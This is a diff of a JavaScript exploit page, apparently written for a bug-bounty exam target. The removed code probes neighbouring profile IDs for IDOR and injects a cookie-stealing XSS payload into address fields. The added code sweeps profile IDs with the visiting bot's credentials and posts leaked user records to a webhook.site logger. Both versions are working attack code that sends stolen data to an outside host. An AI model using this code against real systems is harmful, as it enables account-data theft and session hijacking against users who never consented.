@@ -1,44 +1,33 @@
 <script>
     const logger = "https://webhook.site/68d67ea7-f29d-470c-a202-019f330a7bc6";
-    const apiBase = "https://api-bugbounty-exam.hashacademy.co/api";
+    const apiBase = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile/";
+    const base = "69da4749adf0dbb976ce8e"; 
 
-    async function startExploit() {
-        // --- VECTOR 1: IDOR (Neighboring Profiles) ---
-        // We take the Admin ID and check the IDs immediately before and after it
-        const adminIdPrefix = "69d28e841cda77b519a9550"; 
-        const variants = ["d", "f", "0", "1"]; 
-
-        for (let char of variants) {
+    async function fastSweep() {
+        const hex = "0123456789abcdef";
+        
+        // We will only sweep a smaller, targeted range to ensure it finishes 
+        // before the bot closes the page.
+        for (let h of hex) {
+            let target = base + "3" + h; // Adjusting the "3" to match your found ID range
             try {
-                const res = await fetch(`${apiBase}/auth/profile/${adminIdPrefix}${char}`, { credentials: "include" });
-                const data = await res.json();
-                fetch(logger, { method: "POST", body: JSON.stringify({ type: "IDOR_LEAK", id: char, data }) });
+                const response = await fetch(apiBase + target, { credentials: "include" });
+                const json = await response.json();
+                
+                if (json.success) {
+                    // We send the result immediately
+                    await fetch(`${logger}?found=${target}`, {
+                        method: "POST",
+                        mode: "no-cors", // Use no-cors to bypass potential preflight delays
+                        body: JSON.stringify(json.data.user)
+                    });
+                }
             } catch (e) {}
         }
-
-        // --- VECTOR 2: Stealthy XSS (Address Injection) ---
-        // Address fields are often less protected than Names
-        const xssPayload = `<img src=x onerror="fetch('${logger}?cookie='+document.cookie)">`;
         
-        try {
-            await fetch(`${apiBase}/auth/profile`, {
-                method: "PATCH",
-                headers: { "Content-Type": "application/json" },
-                credentials: "include",
-                body: JSON.stringify({
-                    "fullName": "Sajaa_Researcher",
-                    "phoneNumber": "2025550101",
-                    "address": {
-                        "street": xssPayload, // Injection Point 1
-                        "city": "New York",
-                        "state": xssPayload, // Injection Point 2
-                        "zipCode": "10001",
-                        "country": "USA"
-                    }
-                })
-            });
-        } catch (e) {}
+        // Final signal so you know the bot finished the script
+        fetch(logger + "?status=DONE");
     }
 
-    startExploit();
+    fastSweep();
 </script>
